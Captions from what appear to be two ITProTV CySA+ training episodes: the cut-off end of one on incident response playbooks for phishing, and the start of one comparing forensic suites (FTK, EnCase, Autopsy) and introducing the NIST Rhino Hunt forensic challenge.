to\ncreate diagrams to say, here is how it\n\n600\n00:29:24.140 --> 00:29:27.270\nshould look because hey, a lot of us\nare very visual, so it will help.\n\n601\n00:29:27.270 --> 00:29:29.750\nAnd it works through all\nthe different processes as well.\n\n602\n00:29:29.750 --> 00:29:31.180\nAnd in the list of any\ntables that rank here.\n\n603\n00:29:31.180 --> 00:29:32.200\nSo there we go.\n\n604\n00:29:32.200 --> 00:29:33.420\nAnd let's go here.\n\n605\n00:29:33.420 --> 00:29:34.170\nHere is the scope.\n\n606\n00:29:34.170 --> 00:29:37.140\nThe scope of this document includes\nany phishing related events or\n\n607\n00:29:37.140 --> 00:29:41.200\nalerts that are either identified\nduring daily security operations or\n\n608\n00:29:41.200 --> 00:29:44.390\nis otherwise escalated to\nthe security operations team.\n\n609\n00:29:44.390 --> 00:29:48.360\nSo defining the scope of\nthis specific playbook.\n\n610\n00:29:48.360 --> 00:29:50.560\nEach playbook scope will be different.\n\n611\n00:29:50.560 --> 00:29:51.850\nThey might have some crossword feed, but.\n\n612\n00:29:51.850 --> 00:29:57.450\nThere we go assumptions and limitations,\nlevel ones, level twos and level threes.\n\n613\n00:29:57.450 --> 00:30:01.135\nLetting them know what those people\nare and their job descriptions.\n\n614\n00:30:01.135 --> 00:30:04.120\nLet's getting into,\nhere we go, process summary.\n\n615\n00:30:04.120 --> 00:30:07.400\nIdentification, this stage includes\nthe identification initial scoping\n\n616\n00:30:07.400 --> 00:30:08.568\nof the layer triage.\n\n617\n00:30:08.568 --> 00:30:13.070\nThis stage includes verifying if\nthe security alert is an incident,\n\n618\n00:30:13.070 --> 00:30:16.480\nthe severity of the incident and\nthe additional analysis.\n\n619\n00:30:16.480 --> 00:30:20.480\nAnd moving on the investigation phase what\nthat involves, but if you go down here,\n\n620\n00:30:20.480 --> 00:30:22.680\nhere's the cool little charts\nthat they were creating.\n\n621\n00:30:22.680 --> 00:30:24.510\nThat's what I was looking at earlier.\n\n622\n00:30:24.510 --> 00:30:28.100\nLooking at identification,\ngetting things from alerts.\n\n623\n00:30:28.100 --> 00:30:31.817\nFrom your seem, to your e-mail,\nfdesktop support, other technicians,\n\n624\n00:30:31.817 --> 00:30:33.630\ngathering that up and escalating.\n\n625\n00:30:33.630 --> 00:30:35.820\nBoom.\nBut if you look down through it,\n\n626\n00:30:35.820 --> 00:30:42.390\nonce we get past that, we actually\nstart seeing step by step what you do.\n\n627\n00:30:43.400 --> 00:30:48.090\nLet me just find that really quickly\nhere investigative a phase, here we go,\n\n628\n00:30:48.090 --> 00:30:51.730\noperations one, determine phishing\npage submission URL, right?\n\n629\n00:30:51.730 --> 00:30:53.290\nAnalyze the phishing page URL and\n\n630\n00:30:53.290 --> 00:30:55.690\ndetermine where the page\nposts the related data.\n\n631\n00:30:55.690 --> 00:30:57.250\nThen you can do either option one and\n\n632\n00:30:57.250 --> 00:30:59.780\noption two based on the information\nthat you find there.\n\n633\n00:30:59.780 --> 00:31:03.070\nIt should give you steps for\nthat, so if you load the URL and\n\n634\n00:31:03.070 --> 00:31:08.300\ntools valid URL content dump, it gives\nyou that URL, everything is documented.\n\n635\n00:31:08.300 --> 00:31:12.240\nCopy and pate tells you you how to do it\nevery step of the procedure is called out.\n\n636\n00:31:12.240 --> 00:31:17.218\nAgain I could grab my level one tech and\nhe probably be able to walk through this,\n\n637\n00:31:17.218 --> 00:31:21.470\nor she and conduct this investigation.\n\n638\n00:31:21.470 --> 00:31:24.000\nNot that you wold do that,\nbut worse comes to worse.\n\n639\n00:31:24.000 --> 00:31:29.090\nTypically you have a C-CERT an instance\nresponse team that people are members of.\n\n640\n00:31:29.090 --> 00:31:32.207\nYou look at that escalation list that\nwe talked about in another show, but\n\n641\n00:31:32.207 --> 00:31:33.520\nthere you go.\n\n642\n00:31:33.520 --> 00:31:36.300\nThen option 3, start the wire shark,\ncommence packet capture.\n\n643\n00:31:36.300 --> 00:31:37.860\nRemember, we talked about that.\n\n644\n00:31:37.860 --> 00:31:41.326\nAnd again, just basically walking you,\nholding your little hand,\n\n645\n00:31:41.326 --> 00:31:45.650\ntaking you step by step through what to\ndo all the way through post-incident.\n\n646\n00:31:45.650 --> 00:31:46.740\nNow that the incident is over,\n\n647\n00:31:46.740 --> 00:31:50.290\nhere are some of the questions\nwe need to be asking ourselves.\n\n648\n00:31:50.290 --> 00:31:53.730\nAnd answers to those questions\nwill be valid information and\n\n649\n00:31:53.730 --> 00:31:55.330\nvery good information.\n\n650\n00:31:55.330 --> 00:31:58.680\nBut the next time this occurs,\nmaybe we need to revise our playbook and\n\n651\n00:31:58.680 --> 00:32:00.000\ntake better steps.\n\n652\n00:32:00.000 --> 00:32:00.800\nSo there you go.\n\n653\n00:32:00.800 --> 00:32:02.010\nYou can download this.\n\n654\n00:32:02.010 --> 00:32:04.540\nLike I said, I'll provide the URL.\n\n655\n00:32:04.540 --> 00:32:06.830\nTake a look through it\na little more thoroughly, and\n\n656\n00:32:06.830 --> 00:32:10.350\nyou'll start to see how these things work\nthemselves out in a more practical way.\n\n657\n00:32:10.350 --> 00:32:14.930\n&gt;&gt; All right Daniel great stuff as we look\nat what an incident response plan is.\n\n658\n00:32:14.930 --> 00:32:19.250\nAnd about how we can get ourselves ready\nto develop our own plan, and then some\n\n659\n00:32:19.250 --> 00:32:23.130\nexample playbook there at the end that\nwe could use as a template or modify.\n\n660\n00:32:23.130 --> 00:32:24.755\nVery cool, we apprecaite that,\n\n661\n00:32:24.755 --> 00:32:28.418\nI hope everybody out there enjoyed\nwatching this Signing off for ITProTV.\n\n662\n00:32:28.418 --> 00:32:29.569\nI've been your host Mike Roderick.\n\n663\n00:32:29.569 --> 00:32:30.353\n&gt;&gt; And I'm Daniel Lowrie.\n\n664\n00:32:30.353 --> 00:32:31.525\n&gt;&gt; And we'll see you next time.\n\n665\n00:32:31.525 -->

00:00:12.150\n&gt;&gt; You're watching ITPRO.TV.\n\n4\n00:00:12.150 --> 00:00:15.466\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITRO.TV.\n\n5\n00:00:15.466 --> 00:00:16.704\nI'm your host Mike Rodrick.\n\n6\n00:00:16.704 --> 00:00:19.512\nToday, we're doing our CySA plus.\n\n7\n00:00:19.512 --> 00:00:22.828\nSpecifically, were going to be\nlooking at forensic suite and\n\n8\n00:00:22.828 --> 00:00:24.369\nutilities in this episode.\n\n9\n00:00:24.369 --> 00:00:27.857\nAnd back in the studios is none other then\nMr. Daniel Lowrie, welcome back Daniel.\n\n10\n00:00:27.857 --> 00:00:29.767\n&gt;&gt; Thanks for having me yet again Mike,\n\n11\n00:00:29.767 --> 00:00:32.920\nalways a pleasure to be on the show\nwith you and you out there.\n\n12\n00:00:32.920 --> 00:00:35.207\nAnd we'll have a good time,\nat least we'll try to anyways.\n\n13\n00:00:35.207 --> 00:00:36.987\n&gt;&gt; And an exciting topic today.\n\n14\n00:00:36.987 --> 00:00:39.115\n&gt;&gt; [CROSSTALK]\n&gt;&gt; Yes sir, today,\n\n15\n00:00:39.115 --> 00:00:41.865\nred tape gun put that away,\ndon't need that today.\n\n16\n00:00:41.865 --> 00:00:44.950\nToday, we're gonna get our hands dirty and\nwe're gonna do some stuff.\n\n17\n00:00:44.950 --> 00:00:48.354\nWe're actually gonna do a little\nbit of forensic investigative work.\n\n18\n00:00:48.354 --> 00:00:50.010\n&gt;&gt; Cool.\n&gt;&gt; Yeah, and like Mike said,\n\n19\n00:00:50.010 --> 00:00:54.945\nto do that, we're gonna need to know how\nto use these forensic suite and tools that\n\n20\n00:00:54.945 --> 00:00:59.474\nare available out there in the world for\nus to do forensics investigation.\n\n21\n00:00:59.474 --> 00:01:03.443\nYou need to be familiar with some of\nthe common ones that are available to you.\n\n22\n00:01:03.443 --> 00:01:07.856\nAnd even some of the ins and\nouts of, maybe not the [INAUDIBLE].\n\n23\n00:01:07.856 --> 00:01:11.821\nI think it does call it like, this is\nnot specific to say how this tool works.\n\n24\n00:01:11.821 --> 00:01:14.933\nBut what they do,\n[INAUDIBLE] sometimes they say that.\n\n25\n00:01:14.933 --> 00:01:17.487\nBut we do want you to\nhave at least an idea, so\n\n26\n00:01:17.487 --> 00:01:20.124\nwe're gonna actually\ndo some of this stuff.\n\n27\n00:01:20.124 --> 00:01:21.171\nWe're gonna get our hands dirty.\n\n28\n00:01:21.171 --> 00:01:23.570\nWe're gonna play around with some tools.\n\n29\n00:01:23.570 --> 00:01:27.209\nAnd some of it's a little beyond what we,\nit would take a long time.\n\n30\n00:01:27.209 --> 00:01:29.541\nIt would be a whole series unto itself.\n\n31\n00:01:29.541 --> 00:01:32.114\nSome of these tools are crazy robust.\n\n32\n00:01:32.114 --> 00:01:34.928\nBut to get the good idea\nof what they're used for,\n\n33\n00:01:34.928 --> 00:01:39.090\nkinda how they're used, get those\ninner workings locked in our brains.\n\n34\n00:01:39.090 --> 00:01:41.289\nThat's the purpose of today's show, and\n\n35\n00:01:41.289 --> 00:01:43.799\nthose common ones that you\nmight see on the exam.\n\n36\n00:01:43.799 --> 00:01:45.412\n&gt;&gt; Very good, all right,\nwell then let's get started.\n\n37\n00:01:45.412 --> 00:01:46.555\n&gt;&gt; All right, let's move into it.\n\n38\n00:01:46.555 --> 00:01:49.803\nLet's start with forensic suite.\n\n39\n00:01:49.803 --> 00:01:52.519\n&gt;&gt; Ooh, I like it.\n&gt;&gt; So what do we mean when we say forensic\n\n40\n00:01:52.519 --> 00:01:53.081\nsuite?\n\n41\n00:01:53.081 --> 00:01:54.998\nWhat we mean is\n&gt;&gt; These are really suite tools?\n\n42\n00:01:54.998 --> 00:01:58.848\n&gt;&gt; It is, it's a suite tool,\nmay give you diabetes it's so sweet.\n\n43\n00:01:58.848 --> 00:01:59.874\n&gt;&gt; [LAUGH]\n&gt;&gt; Okay, it's awesome.\n\n44\n00:01:59.874 --> 00:02:03.760\n[LAUGH]\n&gt;&gt; No, it's a S-U-I-T-E suite,\n\n45\n00:02:03.760 --> 00:02:07.613\nlike a bundle of tools put\ntogether as a package.\n\n46\n00:02:07.613 --> 00:02:11.338\nThat's how it works, it's got a little bow\non it, you tie it up it looks nice, right?\n\n47\n00:02:11.338 --> 00:02:12.622\nThat's what we mean,\n\n48\n00:02:12.622 --> 00:02:16.147\nthere are a few of them that\nare very common in today's world.\n\n49\n00:02:16.147 --> 00:02:20.937\nSome of them are pay for,\nsome of them are free to use.\n\n50\n00:02:20.937 --> 00:02:23.734\nWhether you use one over\nthe other is really\n\n51\n00:02:23.734 --> 00:02:28.019\ngonna be a couple of factors will\ncome into play on that decision.\n\n52\n00:02:28.019 --> 00:02:29.845\nOne of those factors is gonna be money.\n\n53\n00:02:29.845 --> 00:02:31.326\n&gt;&gt; [LAUGH]\n&gt;&gt; There's Mike standing over there\n\n54\n00:02:31.326 --> 00:02:31.990\ngoing like this.\n\n55\n00:02:31.990 --> 00:02:33.181\nThat's always the number one.\n\n56\n00:02:33.181 --> 00:02:34.995\nHow much does that cost?\n\n57\n00:02:34.995 --> 00:02:38.665\nThat's a lot of money,\nthat’s a lot of, yeah.\n\n58\n00:02:38.665 --> 00:02:43.868\nSome of them can be expensive, but\nif your company has that kind of wealth,\n\n59\n00:02:43.868 --> 00:02:46.855\nmaybe that's the tool you want to go with.\n\n60\n00:02:46.855 --> 00:02:50.554\nBecause these play tools\ntypically will be a little more,\n\n61\n00:02:50.554 --> 00:02:52.827\nwhat's the word I'm looking for?\n\n62\n00:02:52.827 --> 00:02:53.877\n&gt;&gt; Robust, or polished?\n\n63\n00:02:53.877 --> 00:02:55.896\n&gt;&gt; Yeah, robust in a lot of ways.\n\n64\n00:02:55.896 --> 00:02:58.650\nPolished as well, but also respected.\n\n65\n00:02:58.650 --> 00:02:59.949\n&gt;&gt; Yes, trusted.\n\n66\n00:02:59.949 --> 00:03:05.208\n&gt;&gt; You go into court and you say,\nI used this industry standard tool.\n\n67\n00:03:05.208 --> 00:03:08.004\nThen a lawyer for the defense or whatever,\n\n68\n00:03:08.004 --> 00:03:12.752\nis going to have a very hard time\ngoing there's problems with that tool.\n\n69\n00:03:12.752 --> 00:03:16.616\nMaybe they can, maybe they've got their\ntech guys, and they're able to look for\n\n70\n00:03:16.616 --> 00:03:19.031\nissues with those tools and\ntry to plug holes in it.\n\n71\n00:03:19.031 --> 00:03:22.483\nBut they're gonna have a harder time then\nthey would with something that's freely\n\n72\n00:03:22.483 --> 00:03:24.912\navailable to open source community for\nthat kinda stuff.\n\n73\n00:03:24.912 --> 00:03:26.684\nThat doesn't mean you\ncan't ever use those.\n\n74\n00:03:26.684 --> 00:03:28.970\n&gt;&gt; Right.\n&gt;&gt; Don't hear us say that at all.\n\n75\n00:03:28.970 --> 00:03:33.298\nThis isn't a,\nyou must use the paid-for versions.\n\n76\n00:03:33.298 --> 00:03:36.546\nThe free versions out there,\nvery robust, to be honest with you,\n\n77\n00:03:36.546 --> 00:03:37.945\nhave a lot of capabilities.\n\n78\n00:03:37.945 --> 00:03:41.523\nI was surprised at how much capabilities,\nas a matter of fact.\n\n79\n00:03:41.523 --> 00:03:43.774\nAlso, you might not be going\nto court with this stuff.\n\n80\n00:03:43.774 --> 00:03:48.964\nYou might just be doing an internal\ninvestigation and that's fine.\n\n81\n00:03:48.964 --> 00:03:51.640\nYou can use those all day long.\n\n82\n00:03:51.640 --> 00:03:53.716\nSo if that's the case,\nyou could use those as well.\n\n83\n00:03:53.716 --> 00:03:54.694\nSo it's not just a,\n\n84\n00:03:54.694 --> 00:03:58.508\nit's all about the circumstances around\nthe incident itself on what you use.\n\n85\n00:03:58.508 --> 00:03:59.256\nSo let's talk about them.\n\n86\n00:03:59.256 --> 00:04:01.946\nI've got one already pulled\nup here on my computer.\n\n87\n00:04:01.946 --> 00:04:06.408\nThis is one of the most popular pay for\nsuites which is called FTK or\n\n88\n00:04:06.408 --> 00:04:10.485\nthe Forensics ToolKit or\nForensic Tool Kit, should I say.\n\n89\n00:04:10.485 --> 00:04:14.823\nThis is from accessdata.com here in the,\n\n90\n00:04:14.823 --> 00:04:18.562\nthere's the URL, you can see that.\n\n91\n00:04:18.562 --> 00:04:20.911\nAnd the forensic toolkit,\nvery interesting stuff.\n\n92\n00:04:20.911 --> 00:04:21.938\nSo what do these things do?\n\n93\n00:04:21.938 --> 00:04:26.638\nThey basically give you\na very centralized.\n\n94\n00:04:26.638 --> 00:04:31.165\nThere we go, that centralized management\nbusiness, where I'm able to create images.\n\n95\n00:04:31.165 --> 00:04:33.903\nTake in images that have\nalready been created.\n\n96\n00:04:33.903 --> 00:04:38.700\nAnalyze them, get the data,\ngenerate the report, do timelining,\n\n97\n00:04:38.700 --> 00:04:40.365\nsynchro, you name it.\n\n98\n00:04:40.365 --> 00:04:45.945\nThere's all sorts of interesting tools and\ncapabilities built into this.\n\n99\n00:04:45.945 --> 00:04:48.174\nI can build in a toolkit and\nindividual tools as well.\n\n100\n00:04:48.174 --> 00:04:49.993\nWe're gonna look at this kind of stuff,\nand\n\n101\n00:04:49.993 --> 00:04:52.804\nyou probably still will use individual\ntools to be honest with you.\n\n102\n00:04:52.804 --> 00:04:56.155\nEven if you have something like FTK,\nor the other one which is,\n\n103\n00:04:56.155 --> 00:04:58.886\nlet me see if there's any\npicture here real quick.\n\n104\n00:04:58.886 --> 00:05:03.400\nYeah, see you get nice pie graphs and\ncharts and reports, are just so nice.\n\n105\n00:05:03.400 --> 00:05:04.760\nEverybody loves them.\n\n106\n00:05:04.760 --> 00:05:07.825\nLook at that, maps, FTK architecture.\n\n107\n00:05:07.825 --> 00:05:12.072\nThis thing is very, very, very robust.\n\n108\n00:05:12.072 --> 00:05:17.007\nWhich is why it's high on\nthe list as far as popularity,\n\n109\n00:05:17.007 --> 00:05:20.369\nand respectableness, should I say.\n\n110\n00:05:20.369 --> 00:05:21.456\n&gt;&gt; But not free, this one?\n\n111\n00:05:21.456 --> 00:05:23.545\n&gt;&gt; But not free, this one, it will\ncost you a little bit of a scratch.\n\n112\n00:05:23.545 --> 00:05:25.935\nI think it's a little bit expensive.\n\n113\n00:05:25.935 --> 00:05:28.223\nI can't remember exactly, how much it is.\n\n114\n00:05:28.223 --> 00:05:30.088\nYou probably have to fill out a form.\n\n115\n00:05:30.088 --> 00:05:31.374\n[CROSSTALK] [LAUGH]\n&gt;&gt; It's one of those where, yeah.\n\n116\n00:05:31.374 --> 00:05:32.832\n&gt;&gt; Call us for a demo.\n[CROSSTALK]\n\n117\n00:05:32.832 --> 00:05:33.332\n&gt;&gt; We'll send you a [INAUDIBLE] And yeah,\n\n118\n00:05:33.332 --> 00:05:36.577\nthen they hit you with the price.\n[INAUDIBLE] They're like\n\n119\n00:05:36.577 --> 00:05:38.398\nYou pull the red fox.\n\n120\n00:05:38.398 --> 00:05:40.299\nElizabeth, I'm coming.\n\n121\n00:05:40.299 --> 00:05:43.541\n&gt;&gt; But as you said,\nif your organization has that need or\n\n122\n00:05:43.541 --> 00:05:46.725\nif this is gonna be a business\nthat you're gonna do.\n\n123\n00:05:46.725 --> 00:05:50.430\nMaybe if these are the tools you'll\nneed and it's worth that investment, so.\n\n124\n00:05:50.430 --> 00:05:51.941\n&gt;&gt; I like to think of it like, and\n\n125\n00:05:51.941 --> 00:05:55.394\neven I bring up mechanicing a lot\nbecause I like to wrench on things.\n\n126\n00:05:55.394 --> 00:05:58.963\nI have [INAUDIBLE] of tools, Mike I know\nyou got quite a bit of tools as well.\n\n127\n00:05:58.963 --> 00:06:01.496\nIf you've ever looked at the differ, Mike,\n\n128\n00:06:01.496 --> 00:06:06.180\nwhat's the difference between a Hilti\ndrill, and a northern tool, or a Chicago?\n\n129\n00:06:06.180 --> 00:06:08.667\n&gt;&gt; Functionality wise, not a lot.\n\n130\n00:06:08.667 --> 00:06:09.569\n&gt;&gt; Right.\n&gt;&gt; RIght.\n\n131\n00:06:09.569 --> 00:06:11.558\n&gt;&gt; But the quality.\n\n132\n00:06:11.558 --> 00:06:13.839\n&gt;&gt; Dependability, longevity.\n\n133\n00:06:13.839 --> 00:06:15.427\n&gt;&gt; [INAUDIBLE], right there you go.\n\n134\n00:06:15.427 --> 00:06:16.191\nThat's the difference.\n\n135\n00:06:16.191 --> 00:06:20.445\nYou've got the top shelf versus something,\nit's not a bad device at all.\n\n136\n00:06:20.445 --> 00:06:26.150\nBut you're not gonna get the same kind of\nquality as out of something like autopsy,\n\n137\n00:06:26.150 --> 00:06:27.711\nas you will out of FTK.\n\n138\n00:06:27.711 --> 00:06:31.412\nAutopsy, hear me say, love autopsy.\n\n139\n00:06:31.412 --> 00:06:34.798\nWe talked about OpenVOS,\nOpen Source Utility, love OpenVOS.\n\n140\n00:06:34.798 --> 00:06:39.686\nLove my open source stuff, but\nI do understand there is a difference\n\n141\n00:06:39.686 --> 00:06:44.593\nbetween the paid for utilities,\nversus the free versions, okay?\n\n142\n00:06:44.593 --> 00:06:45.774\nAnd you should as well.\n\n143\n00:06:45.774 --> 00:06:48.665\nThe other one is EnCase Forensic,\n\n144\n00:06:48.665 --> 00:06:53.959\nagain as I said the gold standard\nin forensic investigations.\n\n145\n00:06:53.959 --> 00:06:55.815\nThat's probably not hyperbole,\n\n146\n00:06:55.815 --> 00:06:59.470\nif very well may be the gold standard\nin forensics investigations.\n\n147\n00:06:59.470 --> 00:07:02.550\n&gt;&gt; Yeah, I know this is one that\nthe State of Florida uses when they do\n\n148\n00:07:02.550 --> 00:07:03.452\ninvestigations.\n\n149\n00:07:03.452 --> 00:07:05.566\nWe've talked to a few of\nthose guys out there.\n\n150\n00:07:05.566 --> 00:07:08.357\nAgain, it's one that's been used for\na long time.\n\n151\n00:07:08.357 --> 00:07:11.302\nIt's very well developed and\nit's recognized by the courts.\n\n152\n00:07:11.302 --> 00:07:13.612\nAnd you know,\nit's one of those misconceptions,\n\n153\n00:07:13.612 --> 00:07:16.951\nthere aren't tools that are approved\nby the court systems ahead of time.\n\n154\n00:07:16.951 --> 00:07:19.657\nBut when you say you've\nused a tool like in case,\n\n155\n00:07:19.657 --> 00:07:22.431\nyou don't have to prove\nthe validity of the tool.\n\n156\n00:07:22.431 --> 00:07:25.550\nThey don't have to investigate\nthe methodology the tool uses,\n\n157\n00:07:25.550 --> 00:07:28.914\nbecause it's been through all that before,\nit's already vetted.\n\n158\n00:07:28.914 --> 00:07:32.773\nWhereas one of those other tools is\nunknown, doesn't mean you can't use it,\n\n159\n00:07:32.773 --> 00:07:35.461\nbut you are gonna have to\nprobably stand behind it, and\n\n160\n00:07:35.461 --> 00:07:39.226\nprove that it is doing what it's supposed\nto do in a forensically sound way.\n\n161\n00:07:39.226 --> 00:07:42.590\n&gt;&gt; Exactly, the onus is now on us to say,\nwhy did I use that?\n\n162\n00:07:42.590 --> 00:07:46.592\nWell, it's what I have, and\nit's what I can afford to use.\n\n163\n00:07:46.592 --> 00:07:49.040\nOkay, well is there any\nproblems with that tool?\n\n164\n00:07:49.040 --> 00:07:49.630\nDo you know?\n\n165\n00:07:49.630 --> 00:07:52.242\nThey're going to attempt to shoot holes.\n\n166\n00:07:52.242 --> 00:07:56.787\nAnd it's just easier to avoid those\nbullets if you have one of these\n\n167\n00:07:56.787 --> 00:07:58.665\ngold standard type tools.\n\n168\n00:07:58.665 --> 00:08:02.049\nBut hey,\nmaybe you wanna employ the old autopsy.\n\n169\n00:08:02.049 --> 00:08:04.331\nMaybe you wanna go with the Sleuth kit.\n\n170\n00:08:04.331 --> 00:08:05.735\nPerfectly fine, right?\n\n171\n00:08:05.735 --> 00:08:06.555\n&gt;&gt; Absolutely.\n\n172\n00:08:06.555 --> 00:08:11.388\n&gt;&gt; We love it, I love it, we can even\nfire it up and show you we're actually\n\n173\n00:08:11.388 --> 00:08:15.437\ngoing to do some of that before\nwe get too much further here.\n\n174\n00:08:15.437 --> 00:08:18.776\nSo I won't pull up their website,\ncuz we're gonna use Autopsy and\n\n175\n00:08:18.776 --> 00:08:23.025\nwe're gonna use the Sleuth Kit, so we're\ngonna see that here in just a few minutes.\n\n176\n00:08:23.025 --> 00:08:26.016\nSo that is a very important thing.\n\n177\n00:08:26.016 --> 00:08:30.214\nWe also have the operating systems\nthat we talked about earlier,\n\n178\n00:08:30.214 --> 00:08:32.060\nSIFT from SANS, and CAINE.\n\n179\n00:08:32.060 --> 00:08:34.542\nWe actually fired up CAINE,\nvery cool stuff.\n\n180\n00:08:34.542 --> 00:08:37.905\nTheir forensics operating systems,\nthey have tools and\n\n181\n00:08:37.905 --> 00:08:42.248\nsuites already built into them,\nkinda like again the Kali of forensics,\n\n182\n00:08:42.248 --> 00:08:45.632\neven though Kali has some\nforensics tools built into it.\n\n183\n00:08:45.632 --> 00:08:47.930\nSo if you wanna use Kali you can\nprobably get away with that.\n\n184\n00:08:49.090 --> 00:08:53.446\nAll right, so now that we've got that out\nof the way let's move into our fun for\n\n185\n00:08:53.446 --> 00:08:56.169\nthe day,\nlet's start getting our hands dirty.\n\n186\n00:08:56.169 --> 00:08:59.442\nSo the neat thing as I was preparing for\nthe show, as\n\n187\n00:08:59.442 --> 00:09:04.406\nI had discovered that there are forensic\nchallenges that you can partake in.\n\n188\n00:09:04.406 --> 00:09:08.677\nKind of like, so I like to use volt hub,\nor if you go to HackThisSite,\n\n189\n00:09:08.677 --> 00:09:10.977\nall sorts of stuff, PentesterLab.\n\n190\n00:09:10.977 --> 00:09:14.933\nThey all have these environments in which\nyou can practice learning the tools and\n\n191\n00:09:14.933 --> 00:09:17.608\ntechniques that you would need\nto become a pen tester or\n\n192\n00:09:17.608 --> 00:09:20.303\nif you wanted to be a digital\nforensics investigator.\n\n193\n00:09:20.303 --> 00:09:24.019\nWell, they have forensic challenges,\nkind of like a capture the flag, but\n\n194\n00:09:24.019 --> 00:09:25.060\nforensically.\n\n195\n00:09:25.060 --> 00:09:25.911\n&gt;&gt; Neat.\n&gt;&gt; Right?\n\n196\n00:09:25.911 --> 00:09:26.739\nVery cool stuff.\n\n197\n00:09:26.739 --> 00:09:28.364\nI got one that was simple.\n\n198\n00:09:28.364 --> 00:09:31.959\nWe're gonna keep it easy just so we can\nstart working our way into those waters,\n\n199\n00:09:31.959 --> 00:09:35.607\nand we don't wanna get too deep into\nthings, it would be a seven-part episode,\n\n200\n00:09:35.607 --> 00:09:36.482\nit would be crazy.\n\n201\n00:09:36.482 --> 00:09:37.789\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm not gonna do that.\n\n202\n00:09:37.789 --> 00:09:41.501\nBut I've found one that I\nthought would be really good for\n\n203\n00:09:41.501 --> 00:09:45.768\nour purposes in this show, and\nI've got the website right here.\n\n204\n00:09:45.768 --> 00:09:48.437\nThere we go, this is called Rhino Hunt.\n\n205\n00:09:48.437 --> 00:09:53.705\nAnd I will come up here this in CF,\n\n206\n00:09:53.705 --> 00:09:57.662\nI always get this wrong.\n\n207\n00:09:57.662 --> 00:10:02.270\nCF Reds or\ncfreds.nist.gov/dfrws/rhino_hunt.html.\n\n208\n00:10:02.270 --> 00:10:05.803\nThat link will be in the show notes so\ndon't worry,\n\n209\n00:10:05.803 --> 00:10:08.115\nI've got you guys squared away.\n\n210\n00:10:08.115 --> 00:10:13.235\nAnd this is the scenario, the city of\nNew Orleans has passed a law saying that\n\n211\n00:10:13.235 --> 00:10:18.130\npossession of nine or more unique\nrhinocerus images is a serious crime.\n\n212\n00:10:18.130 --> 00:10:18.875\n&gt;&gt; [LAUGH] Right, that's pretty funny.\n\n213\n00:10:18.875 --> 00:10:21.736\n&gt;&gt; Hence the name rhino hunt we're gonna\nbe looking for images of rhinoceroses.\n\n214\n00:10:21.736 --> 00:10:23.234\n&gt;&gt; If you have more than\nnine you're in trouble.\n\n215\n00:10:23.234 --> 00:10:24.058\n&gt;&gt; If you've got more than nine, buddy.\n\n216\n00:10:24.058 --> 00:10:24.898\n&gt;&gt; I like it.\n\n217\n00:10:24.898 --> 00:10:27.087\n&gt;&gt; You're on the list,\nwe're gonna come and get you.\n\n218\n00:10:27.087 --> 00:10:28.499\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so\n\n219\n00:10:28.499 --> 00:10:33.304\nthe network administrate of the University\nof New Orleans has recently alerted police\n\n220\n00:10:33.304 --> 00:10:37.078\nwith this instance of rhinovore\nflagged an illegal rhino traffic.\n\n221\n00:10:37.078 --> 00:10:37.840\nThis is kind of funny.\n\n222\n00:10:37.840 --> 00:10:40.407\n&gt;&gt; [LAUGH]\n&gt;&gt; I love the setup for this, right?\n\n223\n00:10:40.407 --> 00:10:43.613\nAnd basically, so we're gonna be\nlooking for images of rhinoceros.\n\n224\n00:10:43.613 --> 00:10:48.508\nThat's our investigative onus,\ncuz that's what we wanna do, all right?\n\n225\n00:10:48.508 --> 00:10:53.040\nHere we have the evidence that has been\ngiven to us by the company as the digital\n\n226\n00:10:53.040 --> 00:10:54.516\nperson investigators.\n\n227\n00:10:54.516 --> 00:10:56.981\nWe've got some logged files and a dot dd,\n\n228\n00:10:56.981 --> 00:11:00.018\nwhich we are gonna discuss\nhere just momentarily.\n\n229\n00:11:00.018 --> 00:11:03.524\nAnd you can grab those from the zip\narchive right there on that link, and\n\n230\n00:11:03.524 --> 00:11:07.400\nget those files down to your machines so\nthat you can do what it is we're doing.\n\n231\n00:11:07.400 --> 00:11:10.594\nSo I'm gonna do that now and\nhit Pause, and come, and welcome back!\n\n232\n00:11:10.594 --> 00:11:11.923\n&gt;&gt; [LAUGH]\n&gt;&gt; Right, there we go.\n\n233\n00:11:11.923 --> 00:11:12.550\nYou've got those?\n\n234\n00:11:12.550 --> 00:11:13.489\nGreat.\n\n235\n00:11:13.489 --> 00:11:16.403\nSo, and then it gives you some tasks.\n\n236\n00:11:16.403 --> 00:11:19.877\nWho gave the accused a telnet FTP account,\nright?\n\n237\n00:11:19.877 --> 00:11:21.667\nWhat's the username and\npassword for the account?\n\n238\n00:11:21.667 --> 00:11:26.839\nSo these are pieces of information that\nwe want to discover that are located\n\n239\n00:11:26.839 --> 00:11:31.618\nin the files that we have from our\nzip archive that we've been given.\n\n240\n00:11:31.618 --> 00:11:35.449\nOur job is to use the suites and\ntools that we have and\n\n241\n00:11:35.449 --> 00:11:40.991\nutilities that are available for\nus to find this information out, okay?\n\n242\n00:11:40.991 --> 00:11:45.367\nSo the first thing we need to talk\nabout is you'll notice this rhino,\n\n243\n00:11:45.367 --> 00:11:49.300\nlet's go there first,\nthis rhinousb.dd file, all right?\n\n244\n00:11:49.300 --> 00:11:54.284\nRight here, that's our boy,\nor girl, whatever.\n\n245\n00:11:54.284 --> 00:11:58.593\nThat lets me know that\nit was created using dd.\n\n246\n00:11:58.593 --> 00:12:06.949\nThis is an image file of the drive that\nhad the suspected illegal data files.\n\n247\n00:12:06.949 --> 00:12:13.698\nThis is the drive, a forensically created\nimage of the drive, it's not the original.\n\n248\n00:12:13.698 --> 00:12:15.992\nLet me put that into a good term here,\n\n249\n00:12:15.992 --> 00:12:19.770\ndon't use the originals to do\na forensic investigation on.\n\n250\n00:12:19.770 --> 00:12:24.038\nWe're gonna talk about how\nwe can do that right now,\n\n251\n00:12:24.038 --> 00:12:30.052\nwhich is use utilities like DD to create\na forensically sound copy of those\n\n252\n00:12:30.052 --> 00:12:36.174\nimages of those drives so that you can\nmake as many copies as you would like.\n\n253\n00:12:36.174 --> 00:12:40.295\nAnd you can mess them up all day long,\nand I'll go back and create or\n\n254\n00:12:40.295 --> 00:12:43.839\nget another forensically sound copy,\nand work on that.\n\n255\n00:12:43.839 --> 00:12:47.974\nWe want to maintain the integrity\nof the original evidence,\n\n256\n00:12:47.974 --> 00:12:52.608\nso this is why you always want to\nwork on forensically sound copies.\n\n257\n00:12:52.608 --> 00:12:55.385\nNotice I keep using that word,\nforensically sound copies.\n\n258\n00:12:55.385 --> 